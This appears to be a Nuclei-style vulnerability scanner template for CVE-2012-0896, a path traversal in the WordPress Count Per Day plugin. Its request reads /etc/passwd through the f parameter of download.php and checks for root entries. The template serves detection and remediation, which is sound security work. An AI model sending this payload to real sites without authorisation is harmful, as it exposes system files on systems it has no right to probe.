id: CVE-2012-0896
info:
  name: Count Per Day <= 3.1 - download.php f Parameter Traversal Arbitrary File Access
  author:
  - l0ne1y
  tags:
  - cve
  - cve2012
  - lfi
  - wordpress
  - wp-plugin
  - traversal
  description: |+
    WordPress ‘download.php’绝对路径遍历漏洞
    WordPress是WordPress软件基金会的一套使用PHP语言开发的博客平台。该平台支持在PHP和MySQL的服务器上架设个人博客网站。

    WordPress的Count Per Day模块3.1.1之前版本的download.php中存在绝对路径遍历漏洞。远程攻击者可利用该漏洞借助f参数读取任意文件。

  reference:
  - https://packetstormsecurity.com/files/108631/
  - https://www.cvedetails.com/cve/cve-2012-0896
  - http://secunia.com/advisories/47529
  - http://plugins.trac.wordpress.org/changeset/488883/count-per-day
  severity: high
  classification:
    cve-id:
    - cve-2012-0896
  remediation: |-
    官方修复方案：
    1.目前厂商已经发布了升级补丁以修复此安全问题，补丁获取链接：
    http://wordpress.org/extend/plugins/count-per-day/changelog/
requests:
- matchers:
  - type: regex
    regex:
    - 'root:.*:0:0:'
  - type: status
    status:
    - 200
  matchers-condition: and
  path:
  - '{{BaseURL}}/wp-content/plugins/count-per-day/download.php?n=1&f=/etc/passwd'
  method: GET
